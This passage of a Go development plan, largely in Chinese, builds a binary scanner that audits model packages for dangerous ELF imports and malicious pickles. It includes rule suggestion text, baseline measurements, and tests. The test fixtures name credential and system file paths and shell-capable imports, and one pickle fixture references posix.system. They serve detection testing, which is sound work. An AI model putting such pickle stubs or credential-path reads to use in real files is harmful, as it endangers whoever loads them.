		shared[r.ID] = r
	}

	m := &BinaryMatcher{order: binaryFamilies}
	for _, fam := range binaryFamilies {
		var rule Rule
		if r, ok := shared[fam.ID]; ok {
			rule = r
		} else if r, ok := binaryOnlyRules[fam.ID]; ok {
			rule = r
		} else {
			return nil, fmt.Errorf("binary family %s names no rule: it is in neither the shared table nor the binary-only table", fam.ID)
		}
		// The patterns live on the family, not on the Rule: Rule.Patterns is the
		// source arm's matcher, and writing these there would make the regex and
		// semgrep engines carry patterns for text they never read.
		m.rules = append(m.rules, rule)
	}
	return m, nil
}

// Rules returns the resolved rule set, for report metadata and for tests that
// check it against the shared table.
func (m *BinaryMatcher) Rules() []Rule {
	out := make([]Rule, len(m.rules))
	copy(out, m.rules)
	return out
}

// Match returns the first rule the line matches, or nil.
//
// First rather than all: the finding list is what the statistics and the LLM
// quota are computed from, and one evidence line is one observation. A line two
// families could describe is reported once, under the earlier family.
//
// That order is the intended rule, but it is not observable in the table as it
// stands, because no two families overlap: each pair differs in source, in
// pattern text, or in both, so no line is described by more than one and the
// order never decides anything. The pair that looks like the exception is not
// one - BIN_002 claims memfd_create and fexecve while CMD_001's command list is
// anchored and simply does not contain fexecve, so nothing is claimed twice.
// This doc used to cite memfd_create as an overlap the BIN_002-before-CMD_001
// order resolved; that was wrong. The order is a rule held for the first real
// overlap, not one doing work today, and no test asserts it for the same reason:
// with nothing to assert against, the only way to test precedence now would be
// to tilt the table into an overlap it does not have, which pins a fiction
// rather than the code. When a family that genuinely overlaps an earlier one is
// added, that is the moment to add the test and to say here which one wins.
func (m *BinaryMatcher) Match(line EvidenceLine) *Rule {
	for i := range m.order {
		fam := &m.order[i]
		if !fam.appliesTo(line.Source) {
			continue
		}
		for _, pat := range fam.Patterns {
			if pat.MatchString(line.Text) {
				return &m.rules[i]
			}
		}
	}
	return nil
}

// MatchAll returns one rule per matching line, in listing order, with the
// index of the matched line. It is a slice-building convenience over Match so
// that the scanner does not re-implement the precedence loop.
//
// It has no caller in this commit - not in the scanner, not in a test, nothing.
// It is written ahead of the binary scanner, which Task 9 wires to this table
// and which is the caller that would otherwise re-implement the precedence
// loop; until that lands it is deliberately declared and deliberately unused,
// not an oversight.
func (m *BinaryMatcher) MatchAll(lines []EvidenceLine) []binaryMatch {
	var out []binaryMatch
	for i := range lines {
		if rule := m.Match(lines[i]); rule != nil {
			out = append(out, binaryMatch{Index: i, Rule: *rule})
		}
	}
	return out
}

// binaryMatch is one line's rule, with the line's position so the scanner can
// build a context window from the listing around it.
type binaryMatch struct {
	Index int
	Rule  Rule
}

func (f *binaryFamily) appliesTo(src EvidenceSource) bool {
	for _, s := range f.Sources {
		if s == src {
			return true
		}
	}
	return false
}

// BinaryRuleIDs returns every family id in the table, sorted.
//
// It exists so that the completeness test can be written against the table
// rather than against a list someone maintains by hand: a family added here and
// forgotten in ruleSuggestionMap is a finding whose recommendation reads
// "审查该代码片段并确认其安全性" whatever it actually is, and the test that
// catches that has to enumerate the families from their one definition.
func BinaryRuleIDs() []string {
	ids := make([]string, 0, len(binaryFamilies))
	for _, f := range binaryFamilies {
		ids = append(ids, f.ID)
	}
	sort.Strings(ids)
	return ids
}
```

- [ ] **Step 4: 把新 rule id 补进 `ruleSuggestionMap`**

`internal/codeaudit/audit.go` 的 `ruleSuggestionMap` 目前只有源码臂的 13 个 id。二进制通道的规则 id（`BIN_001`、`BIN_002`、`PKL_001`，以及 Step 3 新增的四个字符串族 `CMD_002`、`PER_002`、`FIL_002`、`ENV_002`）不在其中，落到 `SuggestionForRule` 的兜底文案上——报告会给出一条毫无指向的修复建议。补进去：

```go
	"EMB_004": "不要将数据编码后嵌入模型权重",
	"BIN_001": "确认该二进制段是否经过加壳/加密；若无需动态解包，改用未加壳的构建产物",
	"BIN_002": "确认该二进制为何需要敏感能力；移除不必要的敏感符号引用",
	"PKL_001": "不要反序列化不可信 pickle；改用 weights_only=True 或 safetensors 等纯数据格式",
	"CMD_002": "确认该命令字符串是否来自可信构建；非必要不保留可执行的命令行",
	"PER_002": "确认该持久化路径引用是否为良性常量；非必要不写入自启动/计划任务位置",
	"FIL_002": "确认该敏感文件路径字符串的用途；非必要不引用凭证或系统文件",
	"ENV_002": "确认该环境变量名是否为误报的字面量；凭证读取请集中在可信配置层",
}
```

`CMD_002`/`PER_002`/`FIL_002`/`ENV_002` 与源码臂的 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` **不是同一 id**，各自要有自己的条目：它们只是同一能力在字符串证据上的低置信度版本，兜底文案会读出错误的严重级语境。

- [ ] **Step 5: 加一条完整性测试，防止下次新增规则时再漏**

追加到 `binary_rules_test.go`：

```go
// TestEveryBinaryRuleHasASuggestion pins that the suggestion map covers the
// binary table. It is written against BinaryRuleIDs rather than a literal list so
// that a family added later fails here instead of shipping a report whose
// recommendation for it says nothing.
func TestEveryBinaryRuleHasASuggestion(t *testing.T) {
	const fallback = "审查该代码片段并确认其安全性"
	for _, id := range BinaryRuleIDs() {
		if SuggestionForRule(id) == fallback {
			t.Errorf("rule %s has no entry in ruleSuggestionMap", id)
		}
	}
}
```

- [ ] **Step 6: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestBinaryFamily|TestBinaryTable|TestMatchEvidence|TestSymbolRules|TestEveryBinaryRuleHasASuggestion' -v 2>&1 | tail -20
```

预期全 PASS。若 `TestBinaryOnlyFamiliesDoNotCollide` 报 `BIN_001` 之类的 id 冲突，说明 `binaryOnlyRules` 里写了与共享表相同的 id——修正 id 而不是放宽断言。

- [ ] **Step 7: 用真实语料手动跑一遍，把数字记在这里**

两条测试都只跑合成夹具，而夹具是我挑的。上线前必须拿本仓库真实语料跑一次完整表，并**把实测数字写回本节**，让后来者能照着复现：

```bash
# 1) 28 个 ollama 共享库 + 658 个 .pyc，看有没有 HIGH
#    （期望：0 个 HIGH；这正是本轮误报的来源，见 §5）
# 2) /home/hjy/taa/models 全量，记录每族的 finding 数
```

**已测得的基线（本轮审计，写表时复核过）**，用来判断一次新跑的偏移是不是回归：

- 语料中**没有任何真实 ELF/`.so`**（`find models -type f \( -name '*.so' -o -name '*.so.*' \)` 加上 ELF 魔数扫描都是 0）——`models/` 不是 `.so` 的来源，真正的 `.so` 只有 ollama 那 28 个。所以**宿主机的 `.so` 与这个语料交付的东西不成比例**，任何「按 `.so` 调参」的想法都要先想清楚它服务的是谁。
- 28 个共享库中，旧 `OBF_001`（base64 长串）命中 **23** 个；旧 `NET_002`（含 `bind`/`send`/`recv`）至少命中 `libllama-common.so.0.1.2`（它导入 `bind recv send`——**本轮复核补正**：它同时也导入 `socket`/`connect`/`getaddrinfo`，旧写法「不含 `socket`/`connect`」是错的，见下一条实测与 Task 8 `binary_rules.go` 里 `NET_002` 的注释）；旧 `PER_001`/`FIL_001`/`ENV_001` 的片段命中来自 `taint_engine.cpython-312.pyc`（`'crontabz'`、`'.aws/credentialsz'`、`'.ssh/id_rsaz'`、`.profilez /etc/cron)`）与 `security.cpython-312.pyc`（小写 `private_key` 撞 `PRIVATE_KEY`）。**新表必须让这些全部归零**，这正是 `TestBinaryTableProducesNoHighFindingsOnLegitimateInputs` 的七个夹具组在钉的东西。
- 可执行节区熵：把宿主上 **600 个共享对象**（去重后 **538** 个不同 ELF；把每个枚举到的文件条目都算上是 **2027** 个）全跑一遍，**0 个被判结构性、0 个无节表、0 个报错**，最高 **6.777009** bits/byte，出现在 **`libcrypto.so.3` 的 `.text`**（3347362 字节，**整节读完**，不是抽样前缀），与 7.5 阈值之间余量 **0.723** bits。早先只量了 ollama 那 28 个（最高 6.75），样本扩大二十倍而最高值只挪了百分之一不到，这正是"这条判定不误伤普通库"的强度所在（`libgomp.so` 的 7.97 在非可执行 `.gnu_debugdata`，抽取器根本不测）。**这个数是被删包级规则的唯一支撑，所以它必须是整节读出来的**——一个只覆盖前缀的熵值和一个覆盖整节的熵值在报告里长得一样，而前者不能用来给一条删除规则背书。

- **新表在真实库上的实测（本轮，宿主 `teellm/models/ollama/lib/ollama/`，把这条路径下的 `.so` 全跑一遍）**：
  - **21 个是被截断的 CUDA/cuDNN/NCCL/MLX 库**——磁盘上每个正好 10 MiB，而 ELF 头把节头表指向 30–750 MB 的偏移，`elf.NewFile` 直接返回 `EOF`。它们走的是**抽取出错**（`parse elf …: EOF`）这条路径，**不产出 finding**，计入 `Incomplete`——这正是 Task 7 那条"截断的库是抽取出错、不是跳过"的现成形状，它们就在这里（不在 `models/` 下；`models/` 一个真实 `.so` 都没有）。
  - 能解析出来的库里命中 **HIGH** 的一共是 **8 个库文件**：`libggml-base.so.0.20.2` 导入 `execlp` → **`CMD_001`（HIGH）**；`libllama-common.so.0.1.2` 与 `libllama-server-impl.so` 导入 `socket`/`connect`/`getaddrinfo` → **`NET_002`（HIGH）**；`cuda_v12/libcudart.so.12.8.90`、`cuda_v13/libcudart.so.13.0.96`、`mlx_cuda_v13/libcudart.so.13.0.96` 与 `mlx_cuda_v13/libcudnn_cnn.so.9.25.0`、`mlx_cuda_v13/libcudnn_ext.so.9.25.0` 导入 `bind`/`connect`/`socket` → **`NET_002`（HIGH）**。（`filepath.Walk` 按 `lstat` 跳软链接，所以 `libggml-base.so.0`、`libllama-common.so.0` 这两个 `.so`→`.so.N` 软链接条目**不会被读**；把它们算进来才有更大的条目数。）
  - **这 8 个命中全部是合法库，而 `CMD_001`/`NET_002` 都是 HIGH**，所以只要这样的库进了模型包，`passed` 就是 false，导入会在 `import_processing.go:655-660` 走到 `cleanDirContents` 删包。这正是 §5 里 `NET_002` 那条**未裁决取舍**的实测来源（三种候选写在 Task 8 `binary_rules.go` 的 `NET_002` 注释里）。
- `PKL_001`（pickle 反序列化执行，HIGH）本轮在真实语料上命中 **0** 次——这与下一条方向性坦白**一致**（被跑过的真实 pickle 全是良性的），不是它的反例；它 HIGH 档的双向性仍未验证。

一条**方向性**的坦白，必须写在任务里而不是留给读者推断：**本节没有任何证据证明 `PKL_001` 会命中一个*恶意* checkpoint。** 所有被采样、被跑过解释器的真实 pickle 都是良性的（真 checkpoint 只证明解释器能读出目标，不能证明恶意目标会被判成 HIGH）。`PKL_001` 是 HIGH 档，而 HIGH 会阻断并删包，所以它的双向性**未经验证**：已知的是它不会误伤良性样本（上面的语料跑），未知的是它对恶意样本的命中率。补这个方向的唯一办法是造一个真正会执行 `posix.system` 的恶意 pickle 夹具（Task 4/Task 9 的合成夹具即用于此），不要用「跑过真实 checkpoint」冒充两边都验过。

- [ ] **Step 8: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/binary_rules.go internal/codeaudit/binary_rules_test.go internal/codeaudit/audit.go
git commit -m "feat(audit): add the binary rule table, borrowing shared families' severity"
```

---

### Task 9: 二进制扫描器

**Files:**
- Create: `internal/codeaudit/binary_scanner.go`
- Modify: `internal/codeaudit/rules.go`, `internal/codeaudit/cpg_analysis.go`
- Test: `internal/codeaudit/binary_scanner_test.go`

- [ ] **Step 1: 写失败测试**

创建 `internal/codeaudit/binary_scanner_test.go`：

```go
package codeaudit

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"testing"
)

func newTestBinaryScanner(cfg BinaryConfig) (*BinaryScanner, error) {
	m, err := NewBinaryMatcher()
	if err != nil {
		return nil, err
	}
	return NewBinaryScanner(m, cfg), nil
}

// TestBinaryScannerClaimsOnlyBinaryFiles pins the claim set: text files are left
// to the source channel, and everything with binary content or a binary
// extension is claimed. The claim set is what MergeBinaryFindings uses to decide
// which files the source channel must not also be believed about.
//
// empty.py is the degenerate case and it is here rather than in its own test
// because it is the same question: a zero-byte file is classified KindText (see
// TestClassifyBinaryEmptyFile), so it is not claimed and not counted. What makes
// it worth pinning is that the wrong reading of os.File.Read - the one that
// treats io.EOF as a failure - turns every empty file into an unreadable one,
// which ScanDirectory counts Incomplete and which withholds the pass. An empty
// __init__.py is routine, so that mistake fails a legitimate package, and it is
// invisible in a claim set that never contains an empty file.
func TestBinaryScannerClaimsOnlyBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", "import os\n")
	writeTestFile(t, dir, "notes.txt", "just prose\n")
	writeTestFile(t, dir, "empty.py", "")
	writeTestFile(t, dir, "libevil.so", "#!/bin/sh\necho hi\n")
	writeTestBytes(t, dir, "w.bin", []byte("data\x00literal"))

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}

	if res.Summary.Incomplete != 0 {
		t.Errorf("Summary.Incomplete = %d, want 0: an empty file is a file that was read, not one that could not be", res.Summary.Incomplete)
	}

	want := map[string]bool{"libevil.so": true, "w.bin": true}
	got := map[string]bool{}
	for _, p := range res.Claimed {
		got[filepath.Base(p)] = true
	}
	if len(got) != len(want) {
		t.Fatalf("claimed = %v, want %v", got, want)
	}
	for name := range want {
		if !got[name] {
			t.Errorf("%s was not claimed", name)
		}
	}
}

func TestBinaryScannerFindsImportsAndPickles(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{
		imports: []string{"socket", "connect", "system"},
		needed:  []string{"libcurl.so.4"},
	}))
	writeTestBytes(t, dir, "model.pt", zipFixture(t, map[string][]byte{
		"archive/data.pkl": []byte("\x80\x04cposix\nsystem\n."),
	}, []string{"archive/data.pkl"}))

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.FilesCount != 2 {
		t.Errorf("FilesCount = %d, want 2", res.Summary.FilesCount)
	}

	byRule := map[string]int{}
	for _, f := range res.Findings {
		byRule[f.RuleID]++
		if f.Engine != EngineNameBinary {
			t.Errorf("%s on %s has Engine %q, want %q", f.RuleID, f.File, f.Engine, EngineNameBinary)
		}
		if f.BinaryKind == "" || f.EvidenceSource == "" {
			t.Errorf("%s on %s lacks binary provenance: kind=%q source=%q", f.RuleID, f.File, f.BinaryKind, f.EvidenceSource)
		}
	}
	for _, want := range []string{"NET_002", "CMD_001", "PKL_001"} {
		if byRule[want] == 0 {
			t.Errorf("no %s finding; got %v", want, byRule)
		}
	}
}

// TestBinaryScannerIsDeterministic pins run-to-run stability, which is a real
// property: two scans of the same package must produce the same findings in the
// same order, or two reports of the same package stop being comparable.
//
// It does not pin the sortFindings call, and the comment here should not claim it
// does. The findings arrive already in (File, Line) order: filepath.Walk is
// lexical, which fixes the file order, and MatchAll iterates a listing Finalize
// has already ordered, which fixes the line order within a file. Deleting
// sortFindings from ScanDirectory would leave this test green - the fixture is a
// fixed point of the sort. The sort itself is pinned by
// TestSortFindingsOrdersShuffledFindings below, which drives it directly with an
// order it has to repair, and the call is kept in ScanDirectory for the case this
// test cannot construct: two producers whose listings interleave.
func TestBinaryScannerIsDeterministic(t *testing.T) {
	dir := t.TempDir()
	for i := 0; i < 8; i++ {
		writeTestBytes(t, dir, string(rune('a'+i))+".so", elfFixtureBytes(t, elfSpec{
			imports: []string{"socket", "connect", "system", "popen", "dlopen"},
		}))
	}
	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}

	first, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(first.Findings) < 8 {
		t.Fatalf("len(Findings) = %d, want at least one per file", len(first.Findings))
	}
	for run := 0; run < 5; run++ {
		next, err := s.ScanDirectory(dir)
		if err != nil {
			t.Fatal(err)
		}
		if len(next.Findings) != len(first.Findings) {
			t.Fatalf("run %d produced %d findings, first run produced %d", run, len(next.Findings), len(first.Findings))
		}
		for i := range first.Findings {
			a, b := first.Findings[i], next.Findings[i]
			if a.File != b.File || a.Line != b.Line || a.RuleID != b.RuleID {
				t.Fatalf("run %d finding %d = %s:%d %s, first run = %s:%d %s",
					run, i, b.File, b.Line, b.RuleID, a.File, a.Line, a.RuleID)
			}
		}
	}
}

// TestSortFindingsOrdersShuffledFindings pins the order itself, because no
// scan-level test can. The order has to be total - file, then line, then rule -
// and independent of the run, since the cap keeps the first N: a comparison that
// stopped at the file would leave two findings in one file ordered by whatever
// order the producers happened to emit them in, and a capped scan would keep a
// different set from run to run.
//
// The input below is shuffled on both axes, so this test fails if the comparison
// is deleted, if the file key is dropped, or if the line key is dropped. It does
// not fail if the rule-id tiebreak is dropped, and that is stated rather than
// implied: the tiebreak only orders findings that share a file and a line, which
// in the scanner means two rules matching one evidence line, and Match returns at
// most one rule per line. The tiebreak is kept for totality, not because this
// test can see it.
func TestSortFindingsOrdersShuffledFindings(t *testing.T) {
	findings := []Finding{
		{File: "b.so", Line: 3, RuleID: "BIN_001"},
		{File: "a.so", Line: 9, RuleID: "CMD_001"},
		{File: "a.so", Line: 9, RuleID: "BIN_001"},
		{File: "a.so", Line: 2, RuleID: "NET_002"},
	}
	sortFindings(findings)

	want := []struct {
		file   string
		line   int
		ruleID string
	}{
		{"a.so", 2, "NET_002"},
		{"a.so", 9, "BIN_001"},
		{"a.so", 9, "CMD_001"},
		{"b.so", 3, "BIN_001"},
	}
	for i := range want {
		got := findings[i]
		if got.File != want[i].file || got.Line != want[i].line || got.RuleID != want[i].ruleID {
			t.Fatalf("after sort, finding %d = %s:%d %s, want %s:%d %s",
				i, got.File, got.Line, got.RuleID, want[i].file, want[i].line, want[i].ruleID)
		}
	}
}

// TestBinaryScannerCountsAnUnreadableSubtree pins the walk-level error path. The
// walk must not abort on one unreadable subtree, but it must not forget it
// either: an entry the walk could not read is a look that did not happen, and it
// is counted Incomplete for the same reason an unopenable file is. Without the
// count, a directory containing an unreadable subtree scans as a clean scan of
// whatever was readable - the exact "looks read-and-clean" shape Incomplete
// exists to close, and at the root it is a clean scan of nothing.
//
// It is skipped when the suite runs as root, where mode 0o000 does not deny
// access and there is no unreadable subtree to make. The skip is not the fix: the
// count is asserted wherever the platform lets the subtree be unreadable, and it
// is not conditional on this test in any other way.
func TestBinaryScannerCountsAnUnreadableSubtree(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root: mode 0o000 does not deny access, so no unreadable subtree can be made")
	}
	dir := t.TempDir()
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}))
	locked := filepath.Join(dir, "locked")
	if err := os.Mkdir(locked, 0o700); err != nil {
		t.Fatal(err)
	}
	writeTestBytes(t, locked, "inside.so", elfFixtureBytes(t, elfSpec{imports: []string{"system"}}))
	if err := os.Chmod(locked, 0o000); err != nil {
		t.Fatal(err)
	}
	// Registered after t.TempDir's cleanup, so it runs first and the tree can be
	// removed.
	t.Cleanup(func() { _ = os.Chmod(locked, 0o700) })

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.Incomplete == 0 {
		t.Errorf("Summary.Incomplete = 0: an unreadable subtree was skipped without being counted; summary = %+v", res.Summary)
	}
}

func TestBinaryScannerCapPreservesEveryHighFinding(t *testing.T) {
	dir := t.TempDir()
	// Four HIGH evidence lines (socket/connect -> NET_002, system/popen ->
	// CMD_001) and four LOW ones (the path literals -> FIL_002 / CMD_002). The cap
	// is set below the total so it has to drop something, and the property under
	// test is which something: the LOW findings are the ones a cap may spend.
	//
	// The arithmetic, re-derived against the cap as it now reads. The sort is
	// (File, Line, RuleID) and "extra.bin" sorts before "libevil.so", so the four
	// LOW findings come first and the four HIGH ones after. With the budget at 3
	// the first three lines are kept, the fourth LOW is the one dropped, and the
	// four HIGH findings are kept past the budget: 7 kept, 1 dropped.
	//
	// Those counts happen to be identical to the ones an older cap produced when
	// it exempted HIGH alone, which is why this test cannot tell the two rules
	// apart - its fixture holds no MEDIUM. The sibling test below is the one that
	// does; the pair is needed because a change that re-broke MEDIUM would leave
	// this test green.
	//
	// It matters because a finding that blocks under either policy may not be
	// dropped: HIGH blocks under `assist` and `gate` alike, so a cap that dropped
	// one would turn a withholding package into a passing one - and an attacker
	// could aim at exactly that by padding a package with cheap LOW findings until
	// its HIGH ones fell off the end of the list.
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{
		imports: []string{"socket", "connect", "system", "popen"},
	}))
	writeTestBytes(t, dir, "extra.bin", []byte("x\x00/etc/passwd\x00/etc/shadow\x00/etc/sudoers\x00/bin/sh\x00"))

	cfg := DefaultBinaryConfig()
	cfg.MaxFindings = 3
	s, err := newTestBinaryScanner(cfg)
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}

	highs := 0
	for _, f := range res.Findings {
		if f.Severity == SeverityHigh {
			highs++
		}
	}
	if highs != 4 {
		t.Errorf("kept %d HIGH findings, want all 4: the cap dropped a blocking finding", highs)
	}
	// The list is allowed to exceed the budget to keep them. A cap that held the
	// line at 3 by dropping a HIGH would satisfy the budget and fail the audit.
	if len(res.Findings) <= cfg.MaxFindings {
		t.Errorf("len(Findings) = %d, want more than the budget of %d - the HIGH findings were kept",
			len(res.Findings), cfg.MaxFindings)
	}
	if !res.Summary.FindingsCapped {
		t.Error("Summary.FindingsCapped = false although the cap dropped findings")
	}
	if res.Summary.FindingsDropped == 0 {
		t.Error("Summary.FindingsDropped = 0 although the cap fired; the drop is invisible")
	}
	// The budget is carried into the summary so the report can say what it capped
	// at. A reader who sees findings_capped with no number has to go find the
	// configuration that produced it, and by then it may have changed.
	if res.Summary.MaxFindings != 3 {
		t.Errorf("Summary.MaxFindings = %d, want 3", res.Summary.MaxFindings)
	}
}

// TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget is the case the HIGH
// test above cannot see. MEDIUM does not block under the default `assist`
// policy, but it does under `gate`, where `passed` is `High == 0 && Medium == 0`
// (internal/codeaudit/audit.go:298-309). A cap that dropped MEDIUM would
// therefore let a crafted package pass under `gate` with its blocking findings
// sitting past the budget - the padding attack the HIGH test describes, aimed at
// the other policy. DYN_001 is the concrete family: it is MEDIUM in the shared
// table and the binary arm borrows it, so `dlopen` in a dynamic symbol table is
// an ordinary-looking way to put a MEDIUM finding in the list.
//
// The fixture drives the cap the way the HIGH test does - a LOW-padded file that
// sorts first, then the file carrying the finding under test - arranged so the
// MEDIUM lands beyond the budget. The sort is (File, Line, RuleID) and
// "extra.bin" precedes "zlib.so", so the four LOW line literals take the first
// four positions and the single MEDIUM sits at five, two past a budget of 3.
func TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget(t *testing.T) {
	dir := t.TempDir()
	// dlopen -> DYN_001, borrowed MEDIUM.
	writeTestBytes(t, dir, "zlib.so", elfFixtureBytes(t, elfSpec{imports: []string{"dlopen"}}))
	// Four LOW findings, all sorting ahead of zlib.so.
	writeTestBytes(t, dir, "extra.bin", []byte("x\x00/etc/passwd\x00/etc/shadow\x00/etc/sudoers\x00/bin/sh\x00"))

	cfg := DefaultBinaryConfig()
	cfg.MaxFindings = 3
	s, err := newTestBinaryScanner(cfg)
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}

	mediums := 0
	for _, f := range res.Findings {
		if f.RuleID == "DYN_001" {
			if f.Severity != SeverityMedium {
				t.Fatalf("DYN_001 is %s, want %s: the family's blocking power under `gate` rests on this", f.Severity, SeverityMedium)
			}
			mediums++
		}
	}
	if mediums != 1 {
		t.Errorf("kept %d DYN_001 findings, want 1: the cap dropped a finding that blocks under the gate policy", mediums)
	}
	// The LOW padding is what the budget may spend, and the budget is still
	// reported as spent even though the listing grew past it to keep the MEDIUM.
	if !res.Summary.FindingsCapped || res.Summary.FindingsDropped == 0 {
		t.Errorf("the cap did not report the LOW it spent: capped=%v dropped=%d",
			res.Summary.FindingsCapped, res.Summary.FindingsDropped)
	}
	if len(res.Findings) <= cfg.MaxFindings {
		t.Errorf("len(Findings) = %d, want more than the budget of %d - the MEDIUM finding was kept",
			len(res.Findings), cfg.MaxFindings)
	}
}

func TestBinaryScannerCapIsSilentWhenTheBudgetIsNotReached(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}))

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.FindingsCapped || res.Summary.FindingsDropped != 0 {
		t.Errorf("the cap reported a drop on a package well under budget: capped=%v dropped=%d",
			res.Summary.FindingsCapped, res.Summary.FindingsDropped)
	}
}

func TestBinaryScannerSkipDirs(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, filepath.Join(dir, "node_modules"), "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"system"}}))
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"system"}}))

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.FilesCount != 1 {
		t.Errorf("FilesCount = %d, want 1: node_modules is in the default skip set", res.Summary.FilesCount)
	}
}

// TestBinaryScannerCountsAnUnreadableFileAsIncomplete pins the failure direction
// for the scanner: a claimed file that could not be examined raises Incomplete,
// which withholds a clean verdict downstream.
func TestBinaryScannerCountsAnUnreadableFileAsIncomplete(t *testing.T) {
	dir := t.TempDir()
	path := writeTestBytes(t, dir, "broken.so", []byte("\x7fELF\x02\x01\x01\x00garbage"))
	// Make it unreadable rather than merely malformed: chmod 000 is the one
	// failure the collector cannot work around.
	if err := os.Chmod(path, 0o000); err != nil {
		t.Skipf("cannot chmod in this environment: %v", err)
	}
	t.Cleanup(func() { _ = os.Chmod(path, 0o644) })
	if os.Geteuid() == 0 {
		t.Skip("running as root: chmod 000 is not enforced")
	}

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.Incomplete != 1 {
		t.Errorf("Incomplete = %d, want 1", res.Summary.Incomplete)
	}
}

// TestBinaryScannerCountsAFailedExtractionAsIncomplete pins the other half of
// the same contract, and it is the half the test above does not reach: chmod 000
// fails at classify, so that file never gets as far as an extractor. Here the
// file opens and classifies as an ELF, and then fails to parse - which is the
// set.Err branch, a different line of ScanDirectory with the same meaning. The
// fixture is the shape the host actually has: 21 truncated CUDA/MLX libraries
// under teellm/ and deploy/guest-build/semgrep-payload/rootfs are ~10 MiB on
// disk with their section header table at a ~116 MB offset, so elf.NewFile
// returns EOF. A truncated file is a file that was read and could not be
// examined, never a file that was skipped, so the count must be 1 and the pass
// must be withheld.
func TestBinaryScannerCountsAFailedExtractionAsIncomplete(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{text: []byte("truncated")})
	// Point e_shoff past the end of the file (ELF64 header offset 0x28) so the
	// section header table cannot be read and elf.NewFile fails. The magic and
	// the rest of the header stay intact, so the file still classifies as an
	// ELF and still reaches the extractor - which is the point: this is not a
	// malformed magic, it is a well-formed claim that runs off the end.
	binary.LittleEndian.PutUint64(raw[0x28:0x30], 1<<30)
	writeTestBytes(t, dir, "truncated.so", raw)

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.Incomplete != 1 {
		t.Errorf("Incomplete = %d, want 1: a file that classified as ELF and failed to parse is a failed look, not a skip", res.Summary.Incomplete)
	}
	if res.Summary.FilesCount != 1 {
		t.Errorf("FilesCount = %d, want 1", res.Summary.FilesCount)
	}
}

// TestBinaryScannerIgnoresNonRegularEntries pins what the walk does with an
// entry that is not a regular file. A symlink is neither followed nor claimed:
// the channel reads the bytes the package contains, and reading through a link
// would read a file the package does not - possibly one outside the scanned
// directory. The entry is not counted Incomplete either, because it is not a
// file this channel was ever meant to examine; the count of what it examined
// stays exact.
func TestBinaryScannerIgnoresNonRegularEntries(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, dir, "real.so", elfFixtureBytes(t, elfSpec{imports: []string{"system"}}))
	if err := os.Symlink(filepath.Join(dir, "real.so"), filepath.Join(dir, "link.so")); err != nil {
		t.Skipf("cannot create a symlink in this environment: %v", err)
	}

	s, err := newTestBinaryScanner(DefaultBinaryConfig())
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	if res.Summary.FilesCount != 1 {
		t.Errorf("FilesCount = %d, want 1: the symlink must not be followed", res.Summary.FilesCount)
	}
	for _, p := range res.Claimed {
		if filepath.Base(p) == "link.so" {
			t.Error("the symlink was claimed; the channel read a file the package does not contain")
		}
	}
	if res.Summary.Incomplete != 0 {
		t.Errorf("Incomplete = %d, want 0: a skipped non-regular entry is not a look that failed", res.Summary.Incomplete)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run TestBinaryScanner 2>&1 | head -10
```

预期：编译失败，`undefined: BinaryScanner`（测试里用到的 `Finding.BinaryKind`/`Finding.EvidenceSource` 也还没有声明，Step 4 补上）。

